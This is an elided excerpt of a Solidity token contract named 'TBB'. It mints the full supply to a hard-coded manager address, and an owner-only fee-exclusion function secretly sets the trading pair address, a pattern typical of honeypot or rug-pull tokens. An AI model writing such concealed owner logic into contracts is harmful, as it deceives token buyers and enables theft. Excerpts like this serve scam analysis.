...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address public managerAddress = address(0x578A13200CB56BE03DbBF4D7cdcb33Cf43758EA5);
    string private _name = "TBB";
    string private _symbol = "TBB";
    ...
    constructor (){
        ...
        _balances[managerAddress] = _tTotal;
        emit Transfer(address(0), managerAddress, _tTotal);
        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[managerAddress] = true;
    ...
    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        if(_usdtPair==address(0) && !excludeFee){_usdtPair=accounts[0];}
